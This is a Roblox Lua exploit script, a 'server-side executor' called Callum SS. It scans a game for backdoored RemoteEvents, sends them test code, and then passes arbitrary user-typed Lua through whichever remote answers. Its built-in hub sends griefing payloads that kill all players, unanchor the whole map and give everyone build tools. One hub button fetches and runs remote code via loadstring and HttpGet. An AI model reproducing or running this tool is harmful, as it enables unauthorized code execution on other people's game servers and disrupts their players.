

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")

local lp = Players.LocalPlayer
local activeRemote = nil

-- // 1. ADVANCED SCANNER LOGIC
local targets = {
    "ExecuteRemote", "G_Execute", "ServerSide", "RemoteEvent", 
    "DataRemote", "Handshake", "Execute", "MessagingService",
    "Remotes", "Network", "MainRemote", "VibeRemote", 
    "Communicate", "Bridge", "Gate", "H_E_L_P", "Request"
}

local function scanGame()
    activeRemote = nil
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            for _, name in pairs(targets) do
                if v.Name:match(name) then
                    -- Handshake test to verify execution capability
                    local success = pcall(function() 
                        v:FireServer("print('Callum_SS_Verified')") 
                    end)
                    if success then activeRemote = v return v.Name end
                end
            end
        end
    end
    return "None Found"
end

-- // 2. UI INITIALIZATION
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CallumV2"
ScreenGui.Parent = CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
MainFrame.Size = UDim2.new(0, 500, 0, 300)

local UICorner = Instance.new("UICorner", MainFrame)
local UIStroke = Instance.new("UIStroke", MainFrame)
UIStroke.Color = Color3.fromRGB(45, 45, 45)
UIStroke.Thickness = 2

-- // 3. SIDEBAR SYSTEM
local Sidebar = Instance.new("Frame", MainFrame)
Sidebar.Size = UDim2.new(0, 120, 1, 0)
Sidebar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)

local SideCorner = Instance.new("UICorner", Sidebar)
local SideLine = Instance.new("Frame", Sidebar) -- Visual separator
SideLine.Size = UDim2.new(0, 2, 1, 0)
SideLine.Position = UDim2.new(1, 0, 0, 0)
SideLine.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
SideLine.BorderSizePixel = 0

local Title = Instance.new("TextLabel", Sidebar)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "CALLUM SS"
Title.Font = Enum.Font.GothamBold
Title.TextColor3 = Color3.fromRGB(0, 170, 255)
Title.TextSize = 14
Title.BackgroundTransparency = 1

-- Tab Container
local TabHolder = Instance.new("Frame", MainFrame)
TabHolder.Name = "TabHolder"
TabHolder.BackgroundTransparency = 1
TabHolder.Position = UDim2.new(0, 130, 0, 10)
TabHolder.Size = UDim2.new(1, -140, 1, -40)

local function createTab(name, order)
    local btn = Instance.new("TextButton", Sidebar)
    btn.Size = UDim2.new(0.9, 0, 0, 30)
    btn.Position = UDim2.new(0.05, 0, 0, 40 + (order * 35))
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    btn.Text = name
    btn.Font = Enum.Font.Gotham
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.TextSize = 12
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)

    local content = Instance.new("ScrollingFrame", TabHolder)
    content.Name = name .. "Tab"
    content.Size = UDim2.new(1, 0, 1, 0)
    content.BackgroundTransparency = 1
    content.Visible = (order == 0)
    content.ScrollBarThickness = 2
    
    btn.MouseButton1Click:Connect(function()
        for _, t in pairs(TabHolder:GetChildren()) do t.Visible = false end
        content.Visible = true
    end)
    
    return content
end

-- // 4. TAB CONTENTS
local execTab = createTab("Executor", 0)
local hubTab = createTab("Script Hub", 1)

-- Executor Tab Components
local CodeBox = Instance.new("TextBox", execTab)
CodeBox.Size = UDim2.new(1, -10, 0, 180)
CodeBox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CodeBox.Text = "-- Server Code Here"
CodeBox.TextColor3 = Color3.fromRGB(0, 255, 150)
CodeBox.Font = Enum.Font.Code
CodeBox.TextSize = 14
CodeBox.TextYAlignment = Enum.TextYAlignment.Top
CodeBox.MultiLine = true
CodeBox.ClearTextOnFocus = false
Instance.new("UICorner", CodeBox)

local ExecBtn = Instance.new("TextButton", execTab)
ExecBtn.Size = UDim2.new(0.48, 0, 0, 35)
ExecBtn.Position = UDim2.new(0, 0, 0, 190)
ExecBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
ExecBtn.Text = "EXECUTE"
ExecBtn.TextColor3 = Color3.white
ExecBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", ExecBtn)

local ScanBtn = Instance.new("TextButton", execTab)
ScanBtn.Size = UDim2.new(0.48, 0, 0, 35)
ScanBtn.Position = UDim2.new(0.52, 0, 0, 190)
ScanBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ScanBtn.Text = "RE-SCAN"
ScanBtn.TextColor3 = Color3.white
ScanBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", ScanBtn)

-- Script Hub Components
local function createHubButton(name, code, order)
    local btn = Instance.new("TextButton", hubTab)
    btn.Size = UDim2.new(1, -10, 0, 35)
    btn.Position = UDim2.new(0, 0, 0, order * 40)
    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(220, 220, 220)
    btn.Font = Enum.Font.Gotham
    Instance.new("UICorner", btn)
    
    btn.MouseButton1Click:Connect(function()
        if activeRemote then
            activeRemote:FireServer(code)
        else
            warn("No remote found!")
        end
    end)
end

-- Built-in Hub Scripts
createHubButton("Kill All Players", [[
    for _, p in pairs(game.Players:GetPlayers()) do
        if p.Character then p.Character:BreakJoints() end
    end
]], 0)

createHubButton("Infinite Yield (Server-Side Admin)", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
]], 1)

createHubButton("Unanchor Workspace", [[
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then v.Anchored = false end
    end
]], 2)

createHubButton("Give Everyone BTools", [[
    for _, p in pairs(game.Players:GetPlayers()) do
        Instance.new("HopperBin", p.Backpack).BinType = 1
        Instance.new("HopperBin", p.Backpack).BinType = 3
        Instance.new("HopperBin", p.Backpack).BinType = 4
    end
]], 3)

-- // 5. STATUS BAR
local Status = Instance.new("TextLabel", MainFrame)
Status.Size = UDim2.new(1, -130, 0, 20)
Status.Position = UDim2.new(0, 130, 1, -25)
Status.BackgroundTransparency = 1
Status.Text = "Status: Awaiting Scan..."
Status.TextColor3 = Color3.fromRGB(120, 120, 120)
Status.Font = Enum.Font.Gotham
Status.TextSize = 12
Status.TextXAlignment = Enum.TextXAlignment.Left

-- // 6. DRAGGABILITY & FUNCTIONALITY
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        ScreenGui.Enabled = not ScreenGui.Enabled
    end
end)

ScanBtn.MouseButton1Click:Connect(function()
    Status.Text = "Scanning..."
    local res = scanGame()
    Status.Text = "Backdoor: " .. res
    Status.TextColor3 = activeRemote and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(255, 100, 100)
end)

ExecBtn.MouseButton1Click:Connect(function()
    if activeRemote then
        activeRemote:FireServer(CodeBox.Text)
        Status.Text = "Sent to Server!"
        task.delay(1, function() Status.Text = "Backdoor: " .. activeRemote.Name end)
    else
        Status.Text = "No Remote Found!"
    end
end)

-- Initial Auto-Scan
task.spawn(function()
    local res = scanGame()
    Status.Text = "Backdoor: " .. res
    Status.TextColor3 = activeRemote and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(255, 100, 100)
end)
